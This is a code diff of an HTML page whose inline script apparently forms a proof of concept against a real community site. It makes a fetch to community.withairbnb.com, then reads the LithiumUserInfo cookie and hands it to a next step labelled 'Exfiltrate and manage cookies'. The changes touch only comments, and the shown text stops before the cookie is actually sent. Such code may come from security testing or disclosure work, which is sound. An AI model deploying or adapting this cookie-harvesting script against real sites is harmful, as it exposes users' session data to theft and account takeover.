@@ -8,7 +8,7 @@
 <body>
     <h1>Loading...</h1>
     <script>
-        // Step 1: Make a fetch request to example.com
+        // Step 1: Make a fetch request to the site...
         const apiUrl = 'https://community.withairbnb.com';
         
         console.log('Step 1: Making a fetch request to example.com');
@@ -16,7 +16,7 @@
         fetch(apiUrl)
             .then(response => {
                 console.log('Step 1: Fetch to example.com successful:', response);
-                // Continue with Step 2: Exfiltrate and manage cookie
+                // Continue with Step 2: Exfiltrate and manage cookies...
                 exfiltrateAndManageCookie();
             })
             .catch(error => {
@@ -24,11 +24,11 @@
                 // Handle errors
             });
 
-        // Step 2: Exfiltrate and Manage Cookie
+        // Step 2: Exfiltrate and Manage Cookie...
         function exfiltrateAndManageCookie() {
             console.log('Step 2: Exfiltrating and managing the LithiumUserInfo cookie');
 
-            // Get the value of the LithiumUserInfo cookie
+            // Get the value of the LithiumUserInfo cookie...
             const cookieValue = document.cookie
                 .split('; ')
                 .find(row => row.startsWith('LithiumUserInfo='))
@@ -36,7 +36,7 @@
 
             if (cookieValue) {
                 console.log('Step 2: LithiumUserInfo cookie value:', cookieValue);
-                // Continue with Step 3: Make request to the search endpoint
+                // Continue with Step 3: Make request to the search endpoint...
                 makeRequestToSearchEndpoint(cookieValue);
             } else {
                 console.error('Step 2: LithiumUserInfo cookie not found.');
